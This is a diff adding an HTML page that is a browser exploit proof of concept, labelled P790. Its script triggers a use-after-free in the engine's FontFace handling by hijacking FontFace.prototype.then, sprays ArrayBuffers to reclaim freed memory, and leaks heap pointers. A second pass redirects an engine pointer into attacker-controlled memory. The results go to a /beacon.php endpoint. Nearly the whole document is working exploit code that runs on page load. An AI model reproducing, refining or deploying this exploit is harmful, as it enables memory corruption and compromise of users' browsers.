@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P790 — Two-Pass Pointer Redirect</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; color: #7ee787; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
+</style>
+<script>
+'use strict';
+/* ============================================================
+ * P790 — Two-Pass Pointer Redirect
+ *
+ * P789 crash map: q1,q3,q5,q7,q9,q14 are pointer fields the
+ * engine dereferences during continuation. Even qwords survive.
+ *
+ * PASS 1: UAF with zeroed ABs → leak q11 (heap ptr) and q13
+ *         (heap ptr) from engine continuation writes.
+ *
+ * PASS 2: Second UAF. Pre-fill q1 with a heap address that
+ *         points into ANOTHER ArrayBuffer we control (the
+ *         "fake object"). All other crash qwords (q3,q5,q7,q9)
+ *         zeroed (NULL-safe). See what the engine does when it
+ *         follows q1 into our controlled memory.
+ *
+ * The fake object AB is filled with a recognizable pattern so
+ * we can detect reads (pattern survives) and writes (pattern
+ * changes) at each offset.
+ *
+ * CRASH_CLASS: HIGH — pointer redirect into controlled memory
+ * ============================================================ */
+
+window.onerror = function(msg, url, line){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P790-JSERR&data=' + encodeURIComponent((msg||'') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P790-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+}
+
+var out;
+function log(s){ if(out) out.textContent += s + '\n'; }
+
+/* ============================================================
+ * PASS 1: Zeroed spray UAF to leak heap addresses
+ * ============================================================ */
+function pass1(cb){
+  b('P1-START', '');
+  log('PASS 1: Leak heap addresses via zeroed UAF...');
+
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('f1', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired) return undefined;
+      fired = true;
+      if (st){ st.remove(); st.textContent = ''; st = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      for (var k = 0; k < 64; k++) abs.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em bb1'); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em f1, bb1', 'AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best = -1, bestNz = 0;
+    for (var i = 0; i < abs.length; i++){
+      var u = new Uint8Array(abs[i]), nz = 0;
+      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+      if (nz > bestNz){ bestNz = nz; best = i; }
+    }
+    if (best < 0 || bestNz < 4){
+      b('P1-MISS', 'nz=' + bestNz);
+      log('PASS 1 MISS: no reclaim (nz=' + bestNz + ')');
+      return;
+    }
+    var view = new BigUint64Array(abs[best]);
+    var q0  = view[0];
+    var q11 = view[11];
+    var q13 = view[13];
+    var q1  = view[1];
+    var q3  = view[3];
+
+    b('P1-LEAK', 'q0=0x' + h16(q0) + '|q1=0x' + h16(q1) +
+      '|q3=0x' + h16(q3) + '|q11=0x' + h16(q11) + '|q13=0x' + h16(q13) +
+      '|nz=' + bestNz);
+
+    log('PASS 1 HIT:');
+    log('  q0  (refcnt) = 0x' + h16(q0));
+    log('  q1  (ptr)    = 0x' + h16(q1));
+    log('  q3  (ptr)    = 0x' + h16(q3));
+    log('  q11 (buf)    = 0x' + h16(q11));
+    log('  q13 (sec)    = 0x' + h16(q13));
+
+    /* Pass the leaked addresses to pass 2 */
+    cb(q11, q13, view);
+  }, 350);
+}
+
+/* ============================================================
+ * PASS 2: Pre-fill q1 with address of a fake object AB
+ * ============================================================ */
+function pass2(leakedQ11, leakedQ13, pass1View){
+  b('P2-START', 'q11=0x' + h16(leakedQ11) + '|q13=0x' + h16(leakedQ13));
+  log('\nPASS 2: Redirect q1 to controlled memory...');
+
+  /* Strategy: We need the ADDRESS of an ArrayBuffer's backing store.
+   * We don't have addrof() yet, but we know q11 from pass 1 is a
+   * heap pointer. We'll allocate a "target" AB at 192 bytes, fill it
+   * with a sentinel pattern, then spray many 192B ABs hoping one
+   * lands adjacent to where CSSFontFace gets freed.
+   *
+   * For the redirect: we set q1 = leakedQ11 (a known heap address
+   * from pass 1). That heap address is the m_buffer ptr the engine
+   * wrote — it might point to the Vector's inline buffer within
+   * the same CSSFontFace, or to a heap-allocated buffer. Either way,
+   * the engine will follow q1 → leakedQ11 and try to use whatever
+   * is at that address as an object.
+   *
+   * We allocate ABs at exactly 192 bytes and fill them with a
+   * detectable pattern so if the engine reads from one, we'll see
+   * the values in the beacon. */
+
+  /* First: allocate many target ABs with sentinel pattern */
+  var targets = [];
+  var SENTINEL = BigInt('0xBEEF0000');
+  for (var i = 0; i < 128; i++){
+    var ab = new ArrayBuffer(192);
+    var v = new BigUint64Array(ab);
+    for (var q = 0; q < 24; q++){
+      v[q] = SENTINEL + BigInt(q);
+    }
+    targets.push(ab);
+  }
+  b('P2-TARGETS', 'n=' + targets.length);
+
+  /* Now do the second UAF */
+  var st2 = document.createElement('style');
+  st2.textContent = '@font-face{font-family:bb2;src:local(Arial);unicode-range:U+0044;}';
+  document.head.appendChild(st2);
+
+  var face2 = new FontFace('f2', 'local(Helvetica)', { unicodeRange: 'U+0043' });
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2 = [], fired2 = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired2) return undefined;
+      fired2 = true;
+      if (st2){ st2.remove(); st2.textContent = ''; st2 = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+
+      /* Spray ABs: q1 = leakedQ11 (redirect pointer to known heap)
+       * All other crash qwords (q3,q5,q7,q9) = 0 (NULL-safe)
+       * Even qwords = 0 (safe, they're data fields) */
+      for (var k = 0; k < 64; k++){
+        var ab = new ArrayBuffer(192);
+        var v = new BigUint64Array(ab);
+        /* Only set q1 — everything else stays zeroed for safety */
+        v[1] = leakedQ11;
+        abs2.push(ab);
+      }
+
+      try { document.fonts.check('1em bb2'); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em f2, bb2', 'CD');
+
+  /* If we survive 500ms, the redirect worked without crashing */
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    /* Check pass 2 spray ABs for engine writes */
+    var best2 = -1, bestNz2 = 0;
+    for (var i = 0; i < abs2.length; i++){
+      var u = new Uint8Array(abs2[i]), nz = 0;
+      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+      if (nz > bestNz2){ bestNz2 = nz; best2 = i; }
+    }
+
+    if (best2 >= 0 && bestNz2 >= 4){
+      var view2 = new BigUint64Array(abs2[best2]);
+      b('P2-HIT', 'nz=' + bestNz2 +
+        '|q0=0x' + h16(view2[0]) + '|q1=0x' + h16(view2[1]) +
+        '|q11=0x' + h16(view2[11]) + '|q13=0x' + h16(view2[13]));
+      log('\nPASS 2 HIT (spray AB nz=' + bestNz2 + '):');
+      for (var q = 0; q < 24; q++){
+        if (view2[q] !== BigInt(0)){
+          log('  q' + q + ' = 0x' + h16(view2[q]));
+        }
+      }
+    } else {
+      b('P2-MISS', 'nz=' + bestNz2);
+      log('\nPASS 2: no reclaim in spray ABs (nz=' + bestNz2 + ')');
+    }
+
+    /* Check target ABs for any modification (engine wrote through our pointer) */
+    var modified = 0;
+    for (var i = 0; i < targets.length; i++){
+      var v = new BigUint64Array(targets[i]);
+      for (var q = 0; q < 24; q++){
+        var expected = SENTINEL + BigInt(q);
+        if (v[q] !== expected){
+          if (modified === 0){
+            b('P2-TARGET-WRITE', 'i=' + i + '|q=' + q +
+              '|was=0x' + h16(expected) + '|now=0x' + h16(v[q]));
+            log('\nTARGET AB MODIFIED! i=' + i + ' q' + q +
+              ' was 0x' + h16(expected) + ' now 0x' + h16(v[q]));
+          }
+          modified++;
+        }
+      }
+    }
+
+    if (modified === 0){
+      b('P2-TARGETS-INTACT', 'all_ok');
+      log('\nAll target ABs intact — engine didn\'t write through q11.');
+    } else {
+      b('P2-TARGET-TOTAL', 'modified=' + modified);
+      log('\nTotal modified qwords in targets: ' + modified);
+    }
+
+    /* Full dump of pass 2 engine writes */
+    if (best2 >= 0 && bestNz2 >= 4){
+      var view2 = new BigUint64Array(abs2[best2]);
+      var parts = [];
+      for (var q = 0; q < 24; q++){
+        if (view2[q] !== BigInt(0)) parts.push('q' + q + '=0x' + h16(view2[q]));
+      }
+      b('P2-DUMP', parts.join('|'));
+    }
+
+    b('DONE', 'pass2-complete');
+    log('\n=== P790 COMPLETE ===');
+  }, 500);
+}
+
+/* ============================================================
+ * Main
+ * ============================================================ */
+function run(){
+  out = document.getElementById('out');
+  out.textContent = 'P790 — Two-Pass Pointer Redirect\n';
+  out.textContent += '================================\n\n';
+
+  b('BOOT', 'twopass');
+  pass1(function(q11, q13, p1view){
+    pass2(q11, q13, p1view);
+  });
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script>
+</head>
+<body>
+  <pre id="out">P790 — Two-Pass Pointer Redirect — Loading...</pre>
+</body>
+</html>
